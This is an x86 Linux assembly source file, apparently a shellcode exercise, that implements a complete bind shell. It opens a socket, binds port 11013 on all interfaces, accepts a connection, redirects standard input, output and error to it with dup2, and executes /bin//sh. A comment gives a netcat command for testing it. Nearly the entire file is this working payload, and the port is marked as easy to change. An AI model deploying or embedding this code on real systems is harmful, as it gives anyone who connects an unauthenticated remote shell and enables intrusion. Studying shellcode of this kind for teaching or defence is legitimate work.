; Content:	bind_shell from the scratch in assembly
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	09/2017
;
;
; For testing connect via 'nc -v localhost 11013'
;
; bind port can be changed easily in line 41!
;
;

section .text
global _start

_start:
	; [+] setup socket via socketcall (syscall 102) & sockfd [+]
	push 0x66		; hex 102
	pop eax			; eax		= 102 (socketcall)

	xor ebx, ebx		; cleanup ebx	
	inc ebx			; ebx		= 1
	

	xor esi,esi		; cleanup esi

	push esi		; IPPROTO_IP	= 0 
	push ebx		; SOCK_STREAM	= 1 
	push byte 0x2		; AF_INET	= 2

	mov ecx,esp	     
    
	int 0x80		; exec socket

	mov edi, eax		; save result (sockfd) 

	; [+] bind port via socketcall & bind [+]
    	xor eax, eax		; cleanup eax
    	mov al, 0x66		; eax		= 102 (socketcall)

	push esi		; address from	= 0 (any)
	push dword 0x052B	; port for binding (reverseHex)	<- [#] config here! [#]
	inc ebx			; ebx = 1+1	= 2 (bind)
	push bx			; AF_INET	= 2
	mov ecx,esp             


	; [+] args for bind() [+]
	push 0x10		; addrlen 	= 0.0.0.0 (16 bits)
	push ecx                ; addr to bind struct
	push edi                ; saved socketfd status
	mov ecx,esp             	

	int 0x80                ; exec bind


	; [+] setup listener via socketcall & listen [+]
    	xor eax, eax		; cleanup eax
    	mov al, 0x66		; eax		= 102 (socketcall)
	xor ebx, ebx
	mov bl, 0x4		; ebx		= 4 (listen)

	push esi                ; backlog 	= 0
	push edi                ; saved socketfd status
	mov ecx,esp             
	int 0x80                ; exec listen

	; [+] accept incomming connections via socketcall & accept [+]
    
    	xor eax, eax		; cleanup eax
    	mov al, 0x66		; eax		= 102 (socketcall)
	xor ebx, ebx
	mov bl, 0x5		; ebx		= 5 (accept)

	push esi                ; not required = NULL
	push esi                ; not required = NULL
	push edi                ; saved socketfd status
	mov ecx,esp             
	int 0x80                ; exec accept

	mov edi, eax            ; save fd

	; [+] copies 3 file descriptions STDIN, STDOUT, STDERR via dup2 [+]
    	mov ebx, edi            ; saved socketfd status
    	xor ecx, ecx		; cleanup ecx
    	mov cl,0x2		; ecx		= 2 (for counter)
loop:
	mov al, 0x3F            ; eax 		= 63 (dup2) 
	int 0x80		; exec dup2
	dec ecx                 ; ecx - 1 	

	jns loop

	; [+] finally shell via execve [+]

	mov al, 0xB             ; eax		= 11 (execve) 

	push esi                ; NULL
	push dword 0x68732f2f   ; "//sh"
	push dword 0x6e69622f   ; "/bin"
	mov ebx,esp             ; name = "/bin//sh\x0"

	push esi
	push ebx
	mov ecx, esp            ; argv = [name, 0] 

	mov edx, esi            ; envp = NULL

	int 0x80                ; exec execve 
